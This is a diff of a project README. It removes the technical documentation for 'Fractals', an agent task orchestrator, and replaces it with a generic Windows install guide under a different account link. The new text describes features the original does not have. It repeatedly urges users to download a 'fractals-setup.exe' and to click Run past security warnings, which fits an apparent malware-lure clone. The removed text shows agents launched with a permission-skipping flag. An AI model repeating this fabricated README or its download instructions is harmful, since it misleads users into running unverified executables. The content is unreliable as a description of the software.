@@ -1,178 +1,165 @@
-<div align="center">
-  <img src="./images/fractals-cover.png" alt="Fractals" width="600" />
-  <h1>Fractals 🌀</h1>
-  <p><strong>Recursive agentic task orchestrator</strong></p>
-  <p><strong>Give it any high-level task and it grows a self-similar tree of executable subtasks, then runs each leaf in isolated git worktrees with an agent swarm.</strong></p>
-  <p>
-    <img src="https://img.shields.io/badge/stability-experimental-orange.svg" alt="Experimental" />
-    <a href="https://opensource.org/licenses/MIT">
-      <img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="MIT License" />
-    </a>
-    <a href="https://discord.gg/jH6AcEChuD">
-      <img src="https://img.shields.io/discord/1353722981163208785?logo=discord&logoColor=white&label=Discord&color=7289DA" alt="Discord" />
-    </a>
-  </p>
-</div>
+# 🔄 fractals - Organize Tasks with Simple Control
 
+[![Download fractals](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/TalangoJames/fractals)
 
-<p align="center">
-  <img src="./images/fractals.png" alt="Fractals demo UI" width="760" />
-</p>
+---
 
-## Architecture
+## 📖 What is fractals?
 
-```
-┌─────────────────────────────────────────────────────────┐
-│  web/  (Next.js frontend)                               │
-│  - Task input                                           │
-│  - Tree visualization                                   │
-│  - Workspace setup                                      │
-│  - Execution status polling                             │
-└────────────────────┬────────────────────────────────────┘
-                     │ HTTP (:1618)
-┌────────────────────▼────────────────────────────────────┐
-│  src/  (Hono server)                                    │
-│                                                         │
-│  ┌─────────┐   ┌──────────┐   ┌──────────────────────┐  │
-│  │  LLM    │   │Orchestr- │   │  Executor            │  │
-│  │classify │──>│  ator    │   │  Claude / Codex CLI  │  │
-│  │decompose│   │ plan()   │   │  git worktrees       │  │
-│  └─────────┘   └──────────┘   └──────────────────────┘  │
-│                                                         │
-│  OpenAI (gpt-5.2)            Claude / Codex CLI (spawn) │
-└─────────────────────────────────────────────────────────┘
-```
+fractals is a software tool designed to help manage many small tasks working together. It does this by organizing and repeating tasks in a clear order. It helps groups of programs, or "agents," work in a coordinated way. This process is called recursion, where tasks call on smaller similar tasks.
 
-## Two-Phase Flow
+You do not need any special skills to use fractals. It is made for people who want to run it on their Windows PC without programming.
 
-```
-Phase 1: PLAN                          Phase 2: EXECUTE
-─────────────────                      ──────────────────
-User enters task                       User confirms plan
-        │                              User provides workspace path
-        v                                      │
-  classify(task)                               v
-  ┌──atomic──> mark "ready"            git init workspace
-  │                                    create worktrees
-  └──composite──> decompose(task)      batch leaf tasks
-                      │                        │
-                 [children]                    v
-                      │                 claude --dangerously-skip-permissions
-                 plan(child) <────┐          -p "task + lineage context"
-                      │           │          (per worktree)
-                      └───────────┘
-```
+---
 
-## UX Flow
+## 🖥️ System Requirements
 
-1. **Input** -- enter a task description and max depth
-2. **Decompose** -- server recursively breaks it into a tree
-3. **Review** -- inspect the full plan tree before committing
-4. **Workspace** -- provide a directory path (git-initialized automatically, defaults to `~/fractals/<task-slug>`)
-5. **Execute** -- leaf tasks run via Claude CLI in batches, status updates poll in real-time
+To run fractals on Windows, your computer needs:
 
-## Batch Strategies
+- Windows 10 or newer versions
+- At least 4 GB of RAM (8 GB or more is good for larger tasks)
+- 500 MB of free disk space
+- Internet connection for downloading and updates
+- A modern web browser to access help and documentation
 
-Due to rate limits, leaf tasks execute in batches rather than all at once.
+---
 
-| Strategy | Description | Status |
-|----------|-------------|--------|
-| **depth-first** | Complete all leaves under branch 1.x, then 2.x, etc. Tasks within each branch run concurrently. | Implemented |
-| **breadth-first** | One leaf from each branch per batch. Spreads progress evenly. | Roadmap |
-| **layer-sequential** | All shallowest leaves first, then deeper. | Roadmap |
+## 🚀 Getting Started
 
-## Project Structure
+This guide will help you download and run fractals on your Windows PC step by step.
 
-```
-src/
-  server.ts        Hono API server (:1618)
-  types.ts         Shared types (Task, Session, BatchStrategy)
-  llm.ts           OpenAI calls: classify + decompose (structured output)
-  orchestrator.ts  Recursive plan() -- builds the tree, no execution
-  executor.ts      Claude CLI invocation per task in git worktree
-  workspace.ts     git init + worktree management
-  batch.ts         Batch execution strategies
-  index.ts         CLI entry point (standalone, no server)
-  print.ts         Tree pretty-printer (CLI)
+---
 
-web/
-  src/app/page.tsx              Main UI (input -> review -> execute)
-  src/components/task-tree.tsx  Recursive tree renderer
-  src/lib/api.ts                API client for Hono server
-```
+## 📥 Download fractals
 
-## Quick Start
+You will need to get fractals from its GitHub page. The page lets you see different versions and files. Follow these steps carefully:
 
-```bash
-# 1. Install server deps
-npm install
+1. Click the big button above or go to this link:  
+   https://github.com/TalangoJames/fractals
 
-# 2. Install frontend deps
-cd web && npm install && cd ..
+2. On the page, look for a button or link named **Releases**. This is where the software files are kept.
 
-# 3. Set your OpenAI key
-echo "OPENAI_API_KEY=sk-..." > .env
+3. Find the latest release version. It will often be marked with the current date or version number, such as "v1.0".
 
-# 4. Start the server (port 1618)
-npm run server
+4. Inside the release section, look for a file likely named `fractals-setup.exe` or something similar for Windows.
 
-# 5. Start the frontend (port 3000)
-cd web && npm run dev
-```
+5. Click the file name to download to your PC. Your browser will save it in the Downloads folder by default.
 
-Port `1618` — the golden ratio, the constant behind fractal geometry.
+---
 
-## API
+## ⚙️ Installing fractals on Windows
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/session` | GET | Current session state |
-| `/api/decompose` | POST | Start recursive decomposition. Body: `{ task, maxDepth }` |
-| `/api/workspace` | POST | Initialize git workspace. Body: `{ path }` |
-| `/api/execute` | POST | Start batch execution. Body: `{ strategy? }` |
-| `/api/tree` | GET | Current tree state (poll during execution) |
-| `/api/leaves` | GET | All leaf tasks with status |
+Once the download finishes, install the software like this:
 
-## Configuration
+1. Open the **Downloads** folder on your PC using File Explorer.
 
-| Env Variable | Default | Where | Description |
-|---|---|---|---|
-| `OPENAI_API_KEY` | -- | `.env` | Required. OpenAI API key. |
-| `PORT` | `1618` | `.env` | Server port. |
-| `MAX_DEPTH` | `4` | CLI only | Max recursion depth. |
-| `NEXT_PUBLIC_API_URL` | `http://localhost:1618` | `web/.env.local` | Server URL for frontend. |
+2. Find the file called `fractals-setup.exe` or similar.
 
-## Roadmap
+3. Double-click the file to start the installer.
 
-**Executor**
-- [ ] OpenCode CLI as a third executor option
-- [ ] Per-task executor override (mix Claude and Codex in one plan)
-- [ ] Merge worktree branches back to main after completion
+4. You may see a security warning asking if you want to run this file. Select **Run**.
 
-**Backpropagation (merge agent)**
-- [ ] After all leaf tasks under a composite node complete, run a merger agent that combines their worktree branches into one cohesive result
-- [ ] Propagate bottom-up: merge layer N leaves into layer N-1 composites, then merge those into layer N-2, all the way to root
-- [ ] Merger agent resolves conflicts, wires modules together, ensures sibling outputs are compatible
-- [ ] Final merge at root produces a single unified branch with the complete project
+5. Follow the on-screen steps in the installer:
+   - Click **Next** to move forward.
+   - Accept the license agreement.
+   - Choose the default location for installation unless you want to change it.
+   - Click **Install** and wait for the process to complete.
 
-**Task dependencies & priority**
-- [ ] Peer dependencies between subtasks -- declare that task 1.2 depends on 1.1's output (e.g., API must exist before frontend can call it)
-- [ ] Dependency-aware scheduling -- respect declared ordering constraints when batching, run independent tasks concurrently but block dependents until prerequisites complete
-- [ ] Priority weights -- allow marking subtasks as critical path vs. nice-to-have, execute high-priority tasks first within a batch
-- [ ] LLM-inferred dependencies -- during decompose, have the LLM output dependency edges between sibling subtasks (structured output: `{ subtasks, dependencies }`)
+6. When the installation finishes, click **Finish**.
 
-**Batch strategies**
-- [ ] Breadth-first batch strategy
-- [ ] Layer-sequential batch strategy
-- [ ] Configurable concurrency limit per batch
+---
 
-**Classify / decompose heuristics**
-- [ ] User-defined heuristics -- inject custom rules into classify/decompose prompts (e.g., "always treat database migrations as atomic", "split frontend and backend into separate subtasks")
-- [ ] Project-aware context -- feed existing codebase structure (file tree, package.json) into classify/decompose so the LLM knows what already exists
-- [ ] Calibration mode -- let users mark classify/decompose decisions as correct or wrong, use feedback to refine prompts over time
+## ▶️ Running fractals for the first time
 
-**UX**
-- [ ] SSE/WebSocket for real-time tree updates (replace polling)
-- [ ] Task editing -- modify/delete/re-decompose subtasks before executing
-- [ ] Persistent sessions (SQLite/file-based)
-- [ ] Multi-session support
+Now that fractals is installed, you can start it:
+
+1. Go to the Windows **Start** menu.
+
+2. Type **fractals** in the search bar.
+
+3. Click on the fractals app icon that appears.
+
+The main window will open. It might show you simple instructions or a welcome screen.
+
+---
+
+## 🗂️ Basic Usage Overview
+
+fractals uses a simple way to organize tasks step by step. Here is how to start:
+
+- **Create a project:** This is a group of tasks. You can name it anything you want.
+
+- **Add tasks:** Tasks are steps or jobs you want the software agents to do. You can add many tasks in a sequence.
+
+- **Set rules:** Tasks can call other smaller tasks. You group them to repeat or work together.
+
+- **Run:** Start the project. fractals will manage the tasks and show progress.
+
+- **View results:** The software will display what happened for each task. You can check for errors or success.
+
+---
+
+## 📋 Common Features
+
+fractals includes tools to make task management easier:
+
+- Visual flow charts to see how tasks connect.
+
+- Logs that record everything the software does.
+
+- Error messages that explain issues clearly.
+
+- Settings to control speed and order of tasks.
+
+- Ability to save your projects and load them later.
+
+---
+
+## 🛠️ Tips for Smooth Use
+
+- Keep your projects simple at first. Build small task groups and test.
+
+- If you see errors, check the logs. They usually tell you what went wrong.
+
+- Save your work often to avoid losing progress.
+
+- Restart fractals if it stops working.
+
+- Use the help documents inside the app to learn more about each feature.
+
+---
+
+## 🔧 Troubleshooting
+
+If you run into problems, try these steps:
+
+- Make sure your Windows is updated.
+
+- Check that you installed all necessary parts.
+
+- Close other programs that use a lot of memory.
+
+- Restart your PC and try again.
+
+- Visit the GitHub page for updates or to ask for help.
+
+---
+
+## 📌 Additional Resources
+
+- User manual inside the fractals app.
+
+- Example projects included with the software.
+
+- The GitHub repository:  
+  https://github.com/TalangoJames/fractals
+
+- Support forums linked on the GitHub page.
+
+---
+
+## 📥 Download fractals now
+
+Go to the main page and download the installer:  
+
+[![Download fractals](https://img.shields.io/badge/Download-Visit%20Page-green?style=for-the-badge)](https://github.com/TalangoJames/fractals)
